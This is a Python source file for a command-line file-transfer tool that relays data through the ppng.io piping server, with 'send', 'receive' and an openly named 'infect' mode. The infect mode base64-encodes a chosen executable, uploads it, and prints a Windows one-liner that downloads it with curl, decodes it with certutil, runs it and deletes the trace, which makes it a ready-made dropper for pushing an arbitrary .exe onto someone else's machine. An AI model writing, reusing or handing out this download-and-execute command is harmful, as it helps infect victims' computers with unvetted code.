import requests
import base64
import shutil
import sys
from tqdm import tqdm
import os
import zipfile
import colorama
from colorama import Fore


colorama.init()

try:
    mode = sys.argv[1].lower()
except IndexError:
    print(
        f"{Fore.WHITE}Did not supply mode {Fore.LIGHTBLACK_EX}-> \n   {Fore.WHITE}Usage {Fore.LIGHTBLACK_EX}-> {Fore.WHITE}pipetransfer.exe {Fore.LIGHTBLACK_EX}[{Fore.RED}mode{Fore.LIGHTBLACK_EX}] [path/link] [(Optional Argument)]{Fore.WHITE}\n   Modes {Fore.LIGHTBLACK_EX}:{Fore.LIGHTBLACK_EX}  |{Fore.WHITE} Send{Fore.LIGHTBLACK_EX} | {Fore.WHITE}Receive{Fore.LIGHTBLACK_EX} | {Fore.WHITE}Infect {Fore.LIGHTBLACK_EX}|"
    )
    sys.exit(0)
if mode not in ["send", "receive", "infect"]:
    print(
        f"{Fore.WHITE}Did not supply correct arguments {Fore.LIGHTBLACK_EX}:/{Fore.WHITE}"
    )
    sys.exit(0)
try:
    second_argument = sys.argv[2]
except IndexError:
    print(
        f"{Fore.WHITE}Did not supply path/link {Fore.LIGHTBLACK_EX}-> \n    {Fore.WHITE}Usage {Fore.LIGHTBLACK_EX}-> {Fore.WHITE}pipetransfer.exe {Fore.LIGHTBLACK_EX}[{Fore.WHITE}mode{Fore.LIGHTBLACK_EX}] [{Fore.RED}path/link{Fore.LIGHTBLACK_EX}] [(Optional Argument)]"
    )
    sys.exit(0)
if mode in ["infect", "send"]:
    try:
        third_argument = sys.argv[3]
    except IndexError:
        print(
            f"{Fore.WHITE}Did not supply the link {Fore.LIGHTBLACK_EX}-> \n    {Fore.WHITE}Usage {Fore.LIGHTBLACK_EX}-> {Fore.WHITE}pipetransfer.exe {Fore.LIGHTBLACK_EX}[{Fore.WHITE}infect/send{Fore.LIGHTBLACK_EX}] [{Fore.WHITE}file/folder{Fore.LIGHTBLACK_EX}] [{Fore.RED}link{Fore.LIGHTBLACK_EX}]"
        )
        sys.exit(0)


def create_zip(path):
    if os.path.isdir(path):
        shutil.make_archive(path, "zip", path)
    else:
        with zipfile.ZipFile(f"{path}.zip", "w") as f:
            f.write(path)


def send(path, link):
    try:
        create_zip(path)
        with open(f"{path}.zip", "rb") as f:
            base64_data = base64.b64encode(f.read()).decode()
        package = f"{path}:{base64_data}"
        os.remove(f"{path}.zip")
        print(f"Waiting for receiver{Fore.LIGHTBLACK_EX}...{Fore.WHITE}")
        requests.post(f"https://ppng.io/{link}", data=package)
        print(f"Received{Fore.LIGHTBLACK_EX}.")

    except FileNotFoundError:
        print(
            f"{Fore.YELLOW}{path}{Fore.WHITE} doesn't seem to exist {Fore.LIGHTBLACK_EX}:/"
        )


def receive(link):
    response = requests.get(f"https://ppng.io/{link}", stream=True)
    total_size = int(response.headers.get("content-length", 0))
    with tqdm(total=total_size, unit="B", unit_scale=True, desc="Downloading") as pbar:
        with open("temp.yes", "wb") as file:
            for chunk in response.iter_content(chunk_size=1024):
                if chunk:
                    file.write(chunk)
                    pbar.update(len(chunk))
    with open("temp.yes") as f:
        data = f.read()
    os.remove("temp.yes")
    filename = data.split(":")[0]
    filedata = data.split(":")[1]
    with open(f"{filename}.zip", "wb") as f:
        f.write(base64.b64decode(filedata))
    with zipfile.ZipFile(f"{filename}.zip", "r") as zip_ref:
        file_list = zip_ref.namelist()
        if len(file_list) == 1:
            if file_list[0] == filename:
                zip_ref.extract(file_list[0], path=".", pwd=None)
                os.rename(file_list[0], filename)
            else:
                with zipfile.ZipFile(f"{filename}.zip", "r") as f:
                    f.extractall(filename)
        else:
            with zipfile.ZipFile(f"{filename}.zip", "r") as f:
                f.extractall(filename)
    os.remove(f"{filename}.zip")
    print(f"{Fore.GREEN}Received.")


def infect(path, link):
    if path.endswith(".exe") == True:
        try:
            with open(path, "rb") as f:
                base64_data = base64.b64encode(f.read()).decode()
            print(f"{Fore.WHITE}Generating Command{Fore.LIGHTBLACK_EX}...\n")
            print(
                f"{Fore.WHITE}curl -o temp.txt https://ppng.io/{link} & certutil -decode temp.txt output.exe & output.exe & del temp.txt\n"
            )
            print(f"Waiting for receivers{Fore.LIGHTBLACK_EX}...")
            requests.post(f"https://ppng.io/{link}", data=base64_data)
            print(f"{Fore.GREEN}Received{Fore.LIGHTBLACK_EX}.")

        except FileNotFoundError:
            print(
                f"{Fore.YELLOW}{path} {Fore.WHITE}doesn't seem to exist {Fore.LIGHTBLACK_EX}:/"
            )
    else:
        print(
            f'Incorrect usage of command{Fore.LIGHTBLACK_EX}, perhaps you meant {Fore.LIGHTBLACK_EX}"{Fore.WHITE}send{Fore.LIGHTBLACK_EX}"{Fore.WHITE}?'
        )

match mode:
    case "send" : send(second_argument, third_argument)
    case "receive" : receive(second_argument)
    case "infect" : infect(second_argument, third_argument)
    case _: print(f"{Fore.WHITE}Did not supply correct arguments {Fore.LIGHTBLACK_EX}:/{Fore.WHITE}")
